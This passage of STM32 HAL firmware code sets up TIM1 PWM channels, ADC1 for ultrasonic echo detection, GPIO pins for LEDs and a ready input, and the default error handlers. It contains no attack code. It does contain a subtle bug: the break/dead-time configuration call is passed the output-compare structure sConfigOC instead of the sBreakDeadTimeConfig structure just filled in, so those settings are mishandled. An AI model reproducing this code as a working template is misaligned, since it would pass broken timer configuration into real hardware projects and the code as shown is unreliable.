  sMasterConfig.MasterOutputTrigger2 = TIM_TRGO2_RESET;
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
  if (HAL_TIMEx_MasterConfigSynchronization(&htim1, &sMasterConfig) != HAL_OK)
  {
    Error_Handler();
  }
  sConfigOC.OCMode = TIM_OCMODE_PWM1;
  sConfigOC.Pulse = 166;  // 50% 占空比
  sConfigOC.OCPolarity = TIM_OCPOLARITY_HIGH;
  sConfigOC.OCNPolarity = TIM_OCNPOLARITY_HIGH;
  sConfigOC.OCFastMode = TIM_OCFAST_DISABLE;
  sConfigOC.OCIdleState = TIM_OCIDLESTATE_RESET;
  sConfigOC.OCNIdleState = TIM_OCNIDLESTATE_RESET;
  if (HAL_TIM_PWM_ConfigChannel(&htim1, &sConfigOC, TIM_CHANNEL_1) != HAL_OK)
  {
    Error_Handler();
  }
  if (HAL_TIM_PWM_ConfigChannel(&htim1, &sConfigOC, TIM_CHANNEL_2) != HAL_OK)
  {
    Error_Handler();
  }
  sBreakDeadTimeConfig.OffStateRunMode = TIM_OSSR_DISABLE;
  sBreakDeadTimeConfig.OffStateIDLEMode = TIM_OSSI_DISABLE;
  sBreakDeadTimeConfig.LockLevel = TIM_LOCKLEVEL_OFF;
  sBreakDeadTimeConfig.DeadTime = 0;
  sBreakDeadTimeConfig.BreakState = TIM_BREAK_DISABLE;
  sBreakDeadTimeConfig.BreakPolarity = TIM_BREAKPOLARITY_HIGH;
  sBreakDeadTimeConfig.BreakFilter = 0;
  sBreakDeadTimeConfig.Break2State = TIM_BREAK2_DISABLE;
  sBreakDeadTimeConfig.Break2Polarity = TIM_BREAK2POLARITY_HIGH;
  sBreakDeadTimeConfig.Break2Filter = 0;
  sBreakDeadTimeConfig.AutomaticOutput = TIM_AUTOMATICOUTPUT_DISABLE;
  if (HAL_TIMEx_ConfigBreakDeadTime(&htim1, &sConfigOC) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief ADC1 Initialization Function - 用于超声波回波检测
  * @param None
  * @retval None
  */
static void MX_ADC1_Init(void)
{
  ADC_ChannelConfTypeDef sConfig = {0};

  hadc1.Instance = ADC1;
  hadc1.Init.ClockPrescaler = ADC_CLOCK_ASYNC_DIV4;
  hadc1.Init.Resolution = ADC_RESOLUTION_12B;
  hadc1.Init.ScanConvMode = ADC_SCAN_DISABLE;
  hadc1.Init.EOCSelection = ADC_EOC_SINGLE_CONV;
  hadc1.Init.LowPowerAutoWait = DISABLE;
  hadc1.Init.ContinuousConvMode = ENABLE;
  hadc1.Init.NbrOfConversion = 1;
  hadc1.Init.DiscontinuousConvMode = DISABLE;
  hadc1.Init.ExternalTrigConv = ADC_SOFTWARE_START;
  hadc1.Init.ExternalTrigConvEdge = ADC_EXTERNALTRIGCONVEDGE_NONE;
  hadc1.Init.ConversionDataManagement = ADC_CONVERSIONDATA_DR;
  hadc1.Init.Overrun = ADC_OVR_DATA_PRESERVED;
  hadc1.Init.LeftBitShift = ADC_LEFTBITSHIFT_NONE;
  hadc1.Init.OversamplingMode = DISABLE;
  if (HAL_ADC_Init(&hadc1) != HAL_OK)
  {
    Error_Handler();
  }
  sConfig.Channel = ADC_CHANNEL_0;  // 需要根据实际硬件连接调整
  sConfig.Rank = ADC_REGULAR_RANK_1;
  sConfig.SamplingTime = ADC_SAMPLETIME_1CYCLE_5;
  sConfig.SingleDiff = ADC_SINGLE_ENDED;
  sConfig.OffsetNumber = ADC_OFFSET_NONE;
  sConfig.Offset = 0;
  if (HAL_ADC_ConfigChannel(&hadc1, &sConfig) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief GPIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_GPIO_Init(void)
{
  GPIO_InitTypeDef GPIO_InitStruct = {0};

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOE_CLK_ENABLE();
  __HAL_RCC_GPIOA_CLK_ENABLE();
  __HAL_RCC_GPIOB_CLK_ENABLE();
  __HAL_RCC_GPIOD_CLK_ENABLE();

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, LED_1_Pin|LED_3_Pin, GPIO_PIN_RESET);

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOD, GPIO_PIN_8, GPIO_PIN_RESET);

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(LED_2_GPIO_Port, LED_2_Pin, GPIO_PIN_RESET);

  /*Configure GPIO pin : RDY_Pin */
  GPIO_InitStruct.Pin = RDY_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_INPUT;
  GPIO_InitStruct.Pull = GPIO_PULLDOWN;
  HAL_GPIO_Init(RDY_GPIO_Port, &GPIO_InitStruct);

  /*Configure GPIO pins : LED_1_Pin LED_3_Pin */
  GPIO_InitStruct.Pin = LED_1_Pin|LED_3_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
  HAL_GPIO_Init(GPIOB, &GPIO_InitStruct);

  /*Configure GPIO pin : PD8 */
  GPIO_InitStruct.Pin = GPIO_PIN_8;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
  HAL_GPIO_Init(GPIOD, &GPIO_InitStruct);

  /*Configure GPIO pin : LED_2_Pin */
  GPIO_InitStruct.Pin = LED_2_Pin;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
  HAL_GPIO_Init(LED_2_GPIO_Port, &GPIO_InitStruct);
}

/* USER CODE BEGIN 4 */

/* USER CODE END 4 */

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
  {
  }
  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t *file, uint32_t line)
{
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */

